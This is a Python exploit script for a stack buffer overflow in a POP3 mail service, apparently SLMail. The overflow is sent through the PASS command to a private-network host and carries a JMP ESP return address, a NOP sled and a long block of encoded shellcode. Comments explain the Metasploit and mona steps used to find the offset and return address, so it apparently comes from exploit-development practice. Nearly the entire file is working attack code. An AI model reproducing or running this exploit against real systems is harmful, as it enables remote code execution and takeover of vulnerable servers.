#!/usr/bin/env python

import socket

junk = 2606 * "\x41" # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438 (39694438 is EIP address)
eip = "\x8F\x35\x4A\x5F" # JMP ESP. To find JMP ESP you can use mona. 1) !mona modules 2) search a module that doesn't have any protection, eg: False False False True. 3) then !mona find -s '\xff\xe4' -m slmfc.dll . Then copy the first address of the list of pointers found
nop = 30 * "\x90"
padding = 20 * "\x43" # reference point for my bad chars
buf =  b""
buf += b"\xdd\xc7\xd9\x74\x24\xf4\x5e\xbf\xaa\xef\x25\x15"
buf += b"\x31\xc9\xb1\x52\x31\x7e\x17\x03\x7e\x17\x83\x6c"
buf += b"\xeb\xc7\xe0\x8c\x1c\x85\x0b\x6c\xdd\xea\x82\x89"
buf += b"\xec\x2a\xf0\xda\x5f\x9b\x72\x8e\x53\x50\xd6\x3a"
buf += b"\xe7\x14\xff\x4d\x40\x92\xd9\x60\x51\x8f\x1a\xe3"
buf += b"\xd1\xd2\x4e\xc3\xe8\x1c\x83\x02\x2c\x40\x6e\x56"
buf += b"\xe5\x0e\xdd\x46\x82\x5b\xde\xed\xd8\x4a\x66\x12"
buf += b"\xa8\x6d\x47\x85\xa2\x37\x47\x24\x66\x4c\xce\x3e"
buf += b"\x6b\x69\x98\xb5\x5f\x05\x1b\x1f\xae\xe6\xb0\x5e"
buf += b"\x1e\x15\xc8\xa7\x99\xc6\xbf\xd1\xd9\x7b\xb8\x26"
buf += b"\xa3\xa7\x4d\xbc\x03\x23\xf5\x18\xb5\xe0\x60\xeb"
buf += b"\xb9\x4d\xe6\xb3\xdd\x50\x2b\xc8\xda\xd9\xca\x1e"
buf += b"\x6b\x99\xe8\xba\x37\x79\x90\x9b\x9d\x2c\xad\xfb"
buf += b"\x7d\x90\x0b\x70\x93\xc5\x21\xdb\xfc\x2a\x08\xe3"
buf += b"\xfc\x24\x1b\x90\xce\xeb\xb7\x3e\x63\x63\x1e\xb9"
buf += b"\x84\x5e\xe6\x55\x7b\x61\x17\x7c\xb8\x35\x47\x16"
buf += b"\x69\x36\x0c\xe6\x96\xe3\x83\xb6\x38\x5c\x64\x66"
buf += b"\xf9\x0c\x0c\x6c\xf6\x73\x2c\x8f\xdc\x1b\xc7\x6a"
buf += b"\xb7\xe3\xb0\x75\x23\x8c\xc2\x75\xb1\x46\x4a\x93"
buf += b"\xaf\x46\x1a\x0c\x58\xfe\x07\xc6\xf9\xff\x9d\xa3"
buf += b"\x3a\x8b\x11\x54\xf4\x7c\x5f\x46\x61\x8d\x2a\x34"
buf += b"\x24\x92\x80\x50\xaa\x01\x4f\xa0\xa5\x39\xd8\xf7"
buf += b"\xe2\x8c\x11\x9d\x1e\xb6\x8b\x83\xe2\x2e\xf3\x07"
buf += b"\x39\x93\xfa\x86\xcc\xaf\xd8\x98\x08\x2f\x65\xcc"
buf += b"\xc4\x66\x33\xba\xa2\xd0\xf5\x14\x7d\x8e\x5f\xf0"
buf += b"\xf8\xfc\x5f\x86\x04\x29\x16\x66\xb4\x84\x6f\x99"
buf += b"\x79\x41\x78\xe2\x67\xf1\x87\x39\x2c\x01\xc2\x63"
buf += b"\x05\x8a\x8b\xf6\x17\xd7\x2b\x2d\x5b\xee\xaf\xc7"
buf += b"\x24\x15\xaf\xa2\x21\x51\x77\x5f\x58\xca\x12\x5f"
buf += b"\xcf\xeb\x36"
exploit = junk + eip + nop + buf + padding
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.103", 110))
print s.recv(1024)
s.send("USER christopher" + "\r\n")
print s.recv(1024)
s.send("PASS " + exploit + "\r\n")
print s.recv(1024)
print "%s bytes data has been sent" % len(exploit)
s.close()
